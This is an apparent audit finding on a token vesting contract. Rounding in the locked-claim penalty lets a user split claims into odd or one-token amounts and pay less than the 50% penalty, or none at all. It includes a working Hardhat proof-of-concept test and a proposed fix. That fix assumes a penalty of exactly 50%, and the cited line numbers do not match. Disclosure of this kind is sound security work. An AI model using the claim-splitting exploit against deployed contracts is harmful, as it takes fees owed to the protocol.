# User can claim locked tokens and pay less than the `lockedClaimPenalty`, griefing the protocol

## Impact
### Summary 
The protocol allows users to claim locked tokens but pay `lockedClaimPenalty` being 50% of the amount as penalty for claiming the tokens earlier than expected. However, a user can claim locked tokens and pay less than 50% as penalty griefing the protocol.

### Vulnerability Details

The vulnerability lies in the `Vesting::_claimLockedToken` function i.e. on line `290`, where the protocol calculates the penalty amount without considering the case where the amount is an odd number (see [here](https://github.com/sherlock-audit/2025-03-symm-io-stacking/blob/main/token/contracts/vesting/Vesting.sol#L281-L299)). 

Notice that the protocol intends for users to pay half the amount as penalty for claiming locked tokens. Due to truncation associated with integer division in solidity, calculating half of an odd number results in a number slightly less e.g 9/2 = 4 instead of 4.5. As a result, the protocol will not get up to half the amount as penalty fee if the amount to unlock is an odd number. 

This vulnerability can also be seen by taking a look at the code snippet below. 

```javascript
	function _claimLockedToken(address token, address user, uint256 amount) internal {
		// First, claim any unlocked tokens.
		_claimUnlockedToken(token, user);
		VestingPlan storage vestingPlan = vestingPlans[token][user];
		if (vestingPlan.lockedAmount() < amount) revert InvalidAmount();


		// Adjust the vesting plan
		vestingPlan.resetAmount(vestingPlan.lockedAmount() - amount);
		totalVested[token] -= amount;
292:	uint256 penalty = (amount * lockedClaimPenalty) / 1e18;


		// Ensure sufficient balance (minting if necessary)
		_ensureSufficientBalance(token, amount);


		IERC20(token).transfer(user, amount - penalty);
		IERC20(token).transfer(lockedClaimPenaltyReceiver, penalty);


		emit LockedTokenClaimed(token, user, amount, penalty);
	}
```


### Impact
Because of the truncation in integer division, a user can split the amount to withdraw into smaller chunks of odd numbers. This way, the protocol gets 1 less than the expected amount as penalty fees while the user gets 1 more than half the expected amount as claimed token. This griefs the protocol since the protocol ends up with less `SYMM` tokens as penalty fees than it would if the amount was not an odd number.

If fact, a user can unlock all their locked tokens without paying any fees if they make multiple transactions unlocking one (1) token at a time.


## Proof of Concept
1. `userA` is assigned `1_000` locked tokens. 
2. In order to cheat the protocol, `userA` claims 999 tokens such that less than half the amount is paid as penalty fee. 
3. `userA` accomplishes this by claiming 99 tokens each in 10 transactions (each time, `userA` gets `50` tokens while the protocol receives `49` tokens as penalty) and 9 tokens in one transaction (`userA` gets `5` tokens while the protocol receives `4` tokens as penalty)
4. In the end, `userA` receives `505` tokens while the protocol receives `494` tokens as penalty fee, griefing the protocol.

Place the following code into `vesting.behavior.ts`.

```javascript
describe("SpomariaPoC_claimLockedToken", () => {
		beforeEach(async () => {
			await context.symmioToken.connect(context.signers.admin).mint(await symmVesting.getAddress(), 5000)
			const users = [await context.signers.user1.getAddress()]
			const amounts = ["1000"]
			const now = new Date()
			const startTime = Math.floor(now.getTime() / 1000)

			now.setMonth(now.getMonth() + 9)
			const endTime = Math.floor(now.getTime() / 1000)

			await symmVesting.setupVestingPlans(await context.symmioToken.getAddress(), startTime, endTime, users, amounts)
		})

		it.only("User should pay less than 50% of locked tokens as penalty fee", async () => {
			const oldPenaltyContractBalance = await context.symmioToken.balanceOf(await symmVesting.lockedClaimPenaltyReceiver())
			const oldUserBalance = await context.symmioToken.balanceOf(context.signers.user1)

			// user claims 999 tokens but pays less than half the amount as penalty fee. This is accomplished by claiming 99 tokens each in 10 transactions and 9 tokens in one transaction

			for(let i = 1; i <= 10; i++){
				await symmVesting.connect(context.signers.user1).claimLockedToken(context.symmioToken, 99)
			}
			await symmVesting.connect(context.signers.user1).claimLockedToken(context.symmioToken, 9)
			
			const newPenaltyContractBalance = await context.symmioToken.balanceOf(await symmVesting.lockedClaimPenaltyReceiver())
			const newUserBalance = await context.symmioToken.balanceOf(context.signers.user1)

			await expect (newPenaltyContractBalance).to.be.equal(oldPenaltyContractBalance + BigInt(494))
			await expect (newUserBalance).to.be.equal(oldUserBalance + BigInt(505))
		})
	})
```

Now run `npx hardhat test`

## Recommended Mitigation Steps

Consider modifying the `Vesting::_claimLockedToken` function so that if the amount of locked tokens to be claimed is odd, the penalty fee should be more by 1 to correct the truncation from integer division. This will discourage users from attempting to cheat the protocol by splitting the amount into smaller chunks of odd numbered amounts:

```diff
	function _claimLockedToken(address token, address user, uint256 amount) internal {
		// First, claim any unlocked tokens.
		_claimUnlockedToken(token, user);
		VestingPlan storage vestingPlan = vestingPlans[token][user];
		if (vestingPlan.lockedAmount() < amount) revert InvalidAmount();


		// Adjust the vesting plan
		vestingPlan.resetAmount(vestingPlan.lockedAmount() - amount);
		totalVested[token] -= amount;
-		uint256 penalty = (amount * lockedClaimPenalty) / 1e18;
+		uint256 penalty = amount % 2 == 0 ? (amount * lockedClaimPenalty) / 1e18 : (amount * lockedClaimPenalty) / 1e18 + 1;


		// Ensure sufficient balance (minting if necessary)
		_ensureSufficientBalance(token, amount);


		IERC20(token).transfer(user, amount - penalty);
		IERC20(token).transfer(lockedClaimPenaltyReceiver, penalty);


		emit LockedTokenClaimed(token, user, amount, penalty);
	}
